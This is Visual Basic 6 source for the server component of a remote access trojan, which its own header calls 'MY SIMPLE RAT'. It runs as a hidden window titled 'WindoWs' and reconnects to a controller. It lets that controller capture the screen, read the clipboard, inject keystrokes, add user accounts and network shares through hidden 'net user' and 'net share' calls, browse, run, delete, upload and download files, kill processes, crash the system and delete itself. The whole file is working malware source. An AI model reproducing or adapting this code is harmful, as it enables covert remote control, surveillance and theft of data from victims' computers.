VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   0  'Kein
   Caption         =   "WindoWs"
   ClientHeight    =   3210
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3615
   ControlBox      =   0   'False
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3210
   ScaleWidth      =   3615
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows-Standard
   Begin VB.PictureBox Picture2 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      BackColor       =   &H00C0C0C0&
      BorderStyle     =   0  'Kein
      Height          =   495
      Left            =   0
      ScaleHeight     =   33
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   81
      TabIndex        =   2
      Top             =   0
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.PictureBox Picture1 
      AutoRedraw      =   -1  'True
      Height          =   1815
      Left            =   240
      ScaleHeight     =   1755
      ScaleWidth      =   1875
      TabIndex        =   1
      Top             =   960
      Width           =   1935
   End
   Begin MSWinsockLib.Winsock wsTrans 
      Index           =   0
      Left            =   1200
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   1080
      TabIndex        =   0
      Top             =   600
      Width           =   270
   End
   Begin VB.Timer Timer1 
      Interval        =   5000
      Left            =   720
      Top             =   0
   End
   Begin MSWinsockLib.Winsock wsk 
      Index           =   0
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock wskTelnet 
      Index           =   0
      Left            =   360
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'#########################################'
'#########################################'
'##                                     ##'
'##          MY SIMPLE RAT :)           ##'
'##                                     ##'
'##             28.11.2004              ##'
'##                                     ##'
'##   ~ RIPPING SUCKX ~                 ##'
'##                                     ##'
'##       -> SNIPER109 <-               ##'
'##                                     ##'
'## irc.quakenet.org @ #sniper109       ##'
'#########################################'
'#########################################'

Public LOGGEDING As String
Public CHATTING As String
Public FSO As New FileSystemObject
Public Computer, Service

Private Sub Form_Load()
        On Error Resume Next
        Set Computer = GetObject("WinNT://127.0.0.1,computer")
End Sub

Private Sub Timer1_Timer()
    On Error Resume Next
    For ii = 1 To wsk.UBound
        If wsk(ii).State <> 7 Then
            Dim TMP As Variant
            TMP = Split(wsk(ii).Tag, ":")
            wsk(ii).Close
            wsk(ii).Connect TMP(0), TMP(1)
        End If
    Next ii
End Sub


Private Sub wsk_Close(Index As Integer)
    'Ausloggen
    LOGGEDING = Replace(LOGGEDING, Index, "")
End Sub

Private Sub wsk_Connect(Index As Integer)
Senden Index, CMD_SERVERLOG + PC + MasterSplit + MainModule.Server.Name + MasterSplit + OS
End Sub

Private Sub wsk_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    On Error Resume Next
    Dim InComm As String
    wsk(Index).GetData InComm
    InComm = Decode(InComm)
    Dim Command As String, ReceiveData As String
    Command = Left(InComm, 3)
    ReceiveData = Mid(InComm, 4)
    
    Dim TMP As Variant
    Dim TMP2 As String
    
    If InStr(LOGGEDING, Index) = 0 Then
        If Command = CMD_LOGIN Then
            If ReceiveData = MainModule.Server.Pass Then
                Senden Index, CMD_LOGIN + "1"
                LOGGEDING = LOGGEDING + wsk(Index).RemoteHostIP
            Else
                Senden Index, CMD_LOGIN + "0"
            End If
        End If
    Else
        Select Case Command
            Case CMD_LOGIN
                If ReceiveData = "0" Then
                    Senden Index, CMD_LOGIN + "00"
                    LOGGEDING = Replace(LOGGEDING, Index, "")
                Else
                    Senden Index, CMD_LOGIN + "1"
                End If
            Case CMD_CHAT
                If ReceiveData = MasterSplit Then
                    frmChat.Show
                    CHATTING = CHATTING + Index + "#"
                    Senden Index, CMD_CHAT + MasterSplit
                    Ontop frmChat
                ElseIf ReceiveData = MasterSplit + MasterSplit Then
                    CHATTING = Replace(CHATTING, Index + "#", "")
                    Senden Index, CMD_CHAT + MasterSplit + MasterSplit
                    Unload frmChat
                Else
                    frmChat.Text1.Text = frmChat.Text1.Text + ReceiveData + vbCrLf
                End If
            Case CMD_SENDKEYS
                SendKeys ReceiveData
                Senden Index, CMD_SENDKEYS
            Case CMD_INPUTBOX
                Dim Answer As String
                TMP = Split(ReceiveData, MasterSplit)
                With frmInput
                    .Show
                    .Caption = TMP(0)
                    .Text1 = TMP(2)
                    .Label1 = TMP(1)
                    .Tag = ""
                    .Show
                    Ontop frmInput
                    Do While .Tag = ""
                        DoEvents
                    Loop
                    Senden Index, CMD_INPUTBOX + .Tag
                End With
            Case CMD_MSG
                    TMP = Split(ReceiveData, MasterSplit)
                    Senden Index, CMD_MSG
                    Select Case TMP(2)
                        Case 0: MsgBox TMP(0), TMP(3) + vbInformation, TMP(1)
                        Case 1: MsgBox TMP(0), TMP(3) + vbQuestion, TMP(1)
                        Case 2: MsgBox TMP(0), TMP(3) + vbExclamation, TMP(1)
                        Case 3: MsgBox TMP(0), TMP(3) + vbCritical, TMP(1)
                    End Select
            Case CMD_FAV
                If ReceiveData = MasterSplit Then
                    'tmp2 = ""
                    Set sFolder = FSO.GetFolder(GetSpecialFolder(6))
                    Set sFiles = sFolder.Files
                    For Each dFILE In sFiles
                        If InStr(LCase(dFILE.Path), ".url") <> 0 Then
                            TMP2 = TMP2 + dFILE.Path + MasterSplit + GetFromINI("internetshortcut", "url", dFILE.Path) + MasterSplit + MasterSplit
                        End If
                    Next
                    Senden Index, CMD_FAV + TMP2
                ElseIf Left(ReceiveData, 1) = "#" Then
                    Dim tDest As String: tDest = Mid(Mid(ReceiveData, 1, InStr(ReceiveData, MasterSplit) - 1), 2)
                    Dim tURL As String: tURL = Mid(Replace(ReceiveData, tDest + MasterSplit, ""), 2)
                    WritePrivateProfileString "internetshortcut", "url", tURL, GetSpecialFolder(6) + "\" + tDest + ".url"
                    Senden Index, CMD_FAV + MasterSplit
                ElseIf Left(ReceiveData, 1) = "*" Then
                    tDest = Mid(ReceiveData, 2)
                    Kill GetSpecialFolder(6) + "\" + tDest + ".url"
                    Senden Index, CMD_FAV + MasterSplit + MasterSplit
                ElseIf Left(ReceiveData, 1) = "~" Then
                    tDest = Mid(Mid(ReceiveData, 1, InStr(ReceiveData, MasterSplit) - 1), 2)
                    tURL = Mid(Replace(ReceiveData, tDest + MasterSplit, ""), 2)
                    WritePrivateProfileString "internetshortcut", "url", tURL, GetSpecialFolder(6) + "\" + tDest + ".url"
                    Senden Index, CMD_FAV + MasterSplit + MasterSplit + MasterSplit
                End If
            Case CMD_SERVICES
                Set Computer = GetObject("WinNT://127.0.0.1")
                For Each Service In Computer
                    TMP2 = TMP2 + Service.DisplayName + MasterSplit
                Next
                Senden Index, CMD_SERVICES + TMP2
            Case CMD_SHARE
                Set Computer = GetObject("WinNT://127.0.0.1/LanmanServer")
                For Each Service In Computer
                    TMP2 = TMP2 + Service.Name + MasterSplit + Service.Path + MasterSplit + MasterSplit
                Next
                Senden Index, CMD_SHARE + TMP2
            Case CMD_USER
                Set Computer = GetObject("WinNT://127.0.0.1")
                Computer.Filter = Array("User")
                Dim user As IADsUser
                For Each user In Computer
                    If user.AccountDisabled = False Then
                        TMP2 = TMP2 + user.Name + MasterSplit
                    Else
                        TMP2 = TMP2 + user.Name + " (Deaktiviert)" + MasterSplit
                    End If
                Next
                Senden Index, CMD_USER + TMP2
            Case CMD_SHARE2
                TMP = Split(ReceiveData, MasterSplit)
                If InStr(ReceiveData, MasterSplit & "/DELETE") = 0 Then
                    tDest = TMP(1)
                    If Right(tDest, 1) = "/" Or Right(tDest, 1) = "\" Then tDest = Left(tDest, Len(tDest) - 1)
                    Shell "net share " + TMP(0) + "=" + tDest + " " + TMP(2), vbHide
                    Senden Index, CMD_SHARE2
                Else
                    Shell "net share " + TMP(0) + " " + TMP(1), vbHide
                    Senden Index, CMD_SHARE2 + MasterSplit
                End If
            Case CMD_USER2
                TMP = Split(ReceiveData, MasterSplit)
                If InStr(ReceiveData, MasterSplit & "/DELETE") = 0 Then
                    Shell "net user " + TMP(0) + " " + TMP(1) + " /ADD", vbHide
                    Senden Index, CMD_USER2
                Else
                    Shell "net user " + TMP(0) + " " + TMP(1), vbHide
                    Senden Index, CMD_USER2 + MasterSplit
                End If
            Case CMD_PRINT
                TMP = Split(ReceiveData, MasterSplit)
                Printer.FontBold = TMP(0)
                Printer.FontItalic = TMP(1)
                Printer.FontUnderline = TMP(2)
                Printer.FontStrikethru = TMP(3)
                Printer.Font = TMP(4)
                Printer.FontSize = TMP(5)
                Printer.Print "" & vbCrLf
                Printer.Print TMP(6)
                Printer.EndDoc
                Senden Index, CMD_PRINT
            Case CMD_CLIP
                If ReceiveData = MasterSplit Then
                    Senden Index, CMD_CLIP & Clipboard.GetText
                Else
                    Clipboard.SetText ReceiveData
                    Senden Index, CMD_CLIP & MasterSplit
                End If
            Case CMD_FILE
                If ReceiveData = MasterSplit Then
                    Drive1.Refresh
                    For ii = 0 To Drive1.ListCount - 1
                        TMP2 = TMP2 & Drive1.List(ii) & MasterSplit
                    Next ii
                    Senden Index, CMD_FILE & MasterSplit & "*" & TMP2
                ElseIf Left(ReceiveData, 6) = MasterSplit & MasterSplit Then
                    TMP2 = Mid(ReceiveData, 7)
                    TMP2 = FSO.Drives(TMP2).TotalSize & MasterSplit & FSO.Drives(TMP2).IsReady & MasterSplit & FSO.Drives(TMP2).FileSystem & MasterSplit & FSO.Drives(TMP2).FreeSpace & MasterSplit & FSO.Drives(TMP2).DriveType
                    Senden Index, CMD_FILE & MasterSplit & "#" & TMP2
                Else
                    If InStr(ReceiveData, MasterSplit) = 0 Then
                        Set Rfolder = FSO.GetFolder(ReceiveData).SubFolders
                        Set Rfiles = FSO.GetFolder(ReceiveData).Files
                        For Each tfolder In Rfolder
                            TMP2 = TMP2 & ":" & tfolder.Name & MasterSplit
                        Next
                        For Each tfiles In Rfiles
                            TMP2 = TMP2 & tfiles.Name & MasterSplit
                        Next
                        Senden Index, CMD_FILE & TMP2
                    Else
                        TMP = Split(ReceiveData, MasterSplit)
                        Set Rfolder = FSO.GetFolder(TMP(0)).SubFolders
                        Set Rfiles = FSO.GetFolder(TMP(0)).Files
                        For Each tfolder In Rfolder
                            If InStr(LCase(tfolder.Name), Replace(TMP(1), "*", "")) <> 0 Then
                                TMP2 = TMP2 & ":" & tfolder.Name & MasterSplit
                            End If
                        Next
                        For Each tfiles In Rfiles
                            If InStr(LCase(tfiles.Name), Replace(TMP(1), "*", "")) <> 0 Then
                                TMP2 = TMP2 & tfiles.Name & MasterSplit
                            End If
                        Next
                        If TMP2 = "" Then Senden Index, CMD_FILE & MasterSplit: Exit Sub
                        Senden Index, CMD_FILE & TMP2
                    End If
                    
                End If
            Case CMD_FILEMOD
                TMP = Split(ReceiveData, MasterSplit)
                Select Case TMP(0)
                    Case 1: Senden Index, CMD_FILEMOD & "1" & MasterSplit & ShellFile(Replace(TMP(1), "\\", "\"))
                    Case 2: Senden Index, CMD_FILEMOD & "2" & MasterSplit & ShellFile(Replace(TMP(1), "\\", "\"), True)
                    Case 3: Name Replace(TMP(1), "\\", "\") As Replace(TMP(2), "\\", "\"): Senden Index, CMD_FILEMOD & "3" & MasterSplit
                    Case 4: Senden Index, CMD_FILEMOD & "4" & MasterSplit & DelFile(Replace(TMP(1), "\\", "\"))
                    Case 5: Printer.PaintPicture LoadPicture(Replace(TMP(1), "\\", "\")), 1000, 1000: Senden Index, CMD_FILEMOD & "5" & MasterSplit: Printer.EndDoc
                    Case 8: Senden Index, CMD_FILEMOD & "8" & MasterSplit & FileLen(Replace(TMP(1), "\\", "\"))
                    Case 9: Shell "explorer.exe """ & TMP(1) & """", vbMaximizedFocus: Senden Index, CMD_FILEMOD & "9"
                    Case 10: Dim ttt As String: ttt = TMP(1): SystemParametersInfo SETDESKWALLPAPER, 0, ttt, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE: Senden Index, CMD_FILEMOD & "10"
                    Case 11: MkDir TMP(1): Senden Index, CMD_FILEMOD & "11"
                End Select
            Case CMD_PROCESS
               If ReceiveData = "" Then
                    Senden Index, CMD_PROCESS & ListProcess
               Else
                    runkiller ReceiveData
                    Senden Index, CMD_PROCESS & MasterSplit
               End If
            Case CMD_SERVERINFO
                Senden Index, CMD_SERVERINFO & App.Major & "." & App.Minor & "." & App.Revision & MasterSplit & App.Path & MasterSplit & App.EXEName & MasterSplit & Index & MasterSplit & wsk.UBound & MasterSplit & MainModule.Server.Vic & MasterSplit & MainModule.Server.Name & MasterSplit & wsk(Index).RemotePort & MasterSplit & wsk(Index).LocalPort & MasterSplit & Now & MasterSplit & FileLen(App.Path & "\" & App.EXEName & ".exe") & MasterSplit & wsk(Index).LocalIP
            Case CMD_SERVER
                If ReceiveData = "1" Then Unload Me: End
                If ReceiveData = "2" Then Shell App.Path & "\" & App.EXEName & ".exe", vbNormalFocus: End
                If ReceiveData = "3" Then StartUp.RemoveRegRun SearchMe("autostart"): SetAttr App.Path & "\" & App.EXEName & ".exe", vbNormal: Open "C:\wta3.bat" For Append As #1: Print #1, "@E" & "CHO " & "OF" & "F" & vbCrLf & "DEL """ & App.Path & "\" & App.EXEName & ".exe""" & vbCrLf & "DEL C:\WTA3.bat": Close #1: Shell "C:\wta3.bat", vbHide: End
            Case CMD_TELNET
                TMP = Split(ReceiveData, MasterSplit)
                Select Case TMP(0)
                    Case "1": Unload wskTelnet(Index): Load wskTelnet(Index): wskTelnet(Index).Close: wskTelnet(Index).Connect TMP(1), TMP(2): Senden Index, CMD_TELNET & "1" 'Connecting...
                    Case "2": wskTelnet(Index).Close: Unload wskTelnet(Index): Senden Index, CMD_TELNET & "2" 'Closed
                    Case "3": wskTelnet(Index).SendData TMP(1) & vbCrLf
                End Select
            Case CMD_NUKE
                Senden Index, CMD_NUKE
                DoEvents
                CrashMe
            Case CMD_DELDIR
                Senden Index, CMD_DELDIR & DelDir(ReceiveData)
            Case CMD_DOWNLOAD, CMD_UPLOAD
                Senden Index, CMD_DOWNLOAD & FileLen(ReceiveData)
                Dim tBoundTrans As Long
                tBoundTrans = wsTrans.UBound + 1
                Load wsTrans(tBoundTrans)
                If Command = CMD_UPLOAD Then
                    wsTrans(tBoundTrans).Tag = "U>" & FreeFile & ">" & ReceiveData
                Else
                    wsTrans(tBoundTrans).Tag = "D>!>" & ReceiveData
                End If
                wsTrans(tBoundTrans).Connect wsk(Index).RemoteHostIP, "101"
            Case CMD_SCREEN
                Senden Index, CMD_SCREEN & MakeScreen(Picture1, ReceiveData)
        End Select
    End If
End Sub
Function DelDir(ByVal File) As Long
    On Error GoTo err
    RmDir File
    DelDir = 1
    Exit Function
err:
    DelDir = 0
End Function
Function DelFile(ByVal File) As Long
    On Error GoTo err
    Kill File
    DelFile = 1
    Exit Function
err:
    DelFile = 0
End Function
Function ShellFile(ByVal File, Optional Hide As Boolean) As Long
    On Error GoTo err
    If Hide <> True Then
        Shell File, vbNormalFocus
    Else
        Shell File, vbHide
    End If
    ShellFile = 1
    Exit Function
err:
    ShellFile = 0
End Function

Private Sub wsk_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    'Ausloggen
    LOGGEDING = Replace(LOGGEDING, Index, "")
End Sub

Private Sub wskTelnet_Close(Index As Integer)
On Error Resume Next: Senden Index, CMD_TELNET & "5" 'Connection closed
End Sub

Private Sub wskTelnet_Connect(Index As Integer)
On Error Resume Next: Senden Index, CMD_TELNET & "7" 'Connected
End Sub

Private Sub wskTelnet_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim TMP As String: wskTelnet(Index).GetData TMP
Senden Index, CMD_TELNET & "6" & MasterSplit & TMP 'Sending
End Sub

Private Sub wskTelnet_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next: Senden Index, CMD_TELNET & "4" 'Connection terminated
End Sub

Private Sub wsTrans_Close(Index As Integer)
    On Error Resume Next
    
    Dim TMP As String
    wsTrans(Index).GetData TMP
    Dim FT As Variant
    FT = Split(wsTrans(Index).Tag, ">")
    Close FT(1)
End Sub

Private Sub wsTrans_Connect(Index As Integer)
    On Error Resume Next
    Dim tF As Variant
    tF = Split(wsTrans(Index).Tag, ">")
    'Server => Client
    If InStr(wsTrans(Index).Tag, "D>") Then
        Dim curbyte As Long, dFileSize As Long, bBuffer As String, sPacketSize As Long, FF As Long, PrevPackSize As Long
        FF = FreeFile
        curbyte = 0
        dFileSize = FileLen(tF(2))
        sPacketSize = 8000
        
        Open tF(2) For Binary Access Read As #FF
            Do Until (dFileSize - curbyte) < sPacketSize
                bBuffer = Space(sPacketSize)
                Get #FF, curbyte + 1, bBuffer
                wsTrans(Index).SendData bBuffer
                curbyte = curbyte + sPacketSize
                bBuffer = ""
                DoEvents
                Do While InStr(wsTrans(Index).Tag, "!")
                    DoEvents
                Loop
                wsTrans(Index).Tag = Replace(wsTrans(Index).Tag, "?", "!")
            Loop
            DoEvents
            PrevPackSize = dFileSize - curbyte
            bBuffer = Space(PrevPackSize)
            Get #FF, curbyte + 1, bBuffer
            curbyte = curbyte + PrevPackSize
            wsTrans(Index).SendData bBuffer
            
        DoEvents
        Do While InStr(wsTrans(Index).Tag, "!")
            DoEvents
        Loop
        DoEvents
        wsTrans(Index).Close
    Else
        'Client => Server
        FF = tF(1)
        Open tF(2) For Output As #FF
    End If
End Sub

Private Sub wsTrans_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    On Error Resume Next
    Dim TMP As String
    wsTrans(Index).GetData TMP
    Dim FT As Variant
    FT = Split(wsTrans(Index).Tag, ">")
    Dim FF As Long
    FF = FT(1)
    Print #FF, TMP;
End Sub

Private Sub wsTrans_SendComplete(Index As Integer)
    On Error Resume Next
    wsTrans(Index).Tag = Replace(wsTrans(Index).Tag, "!", "?")
End Sub
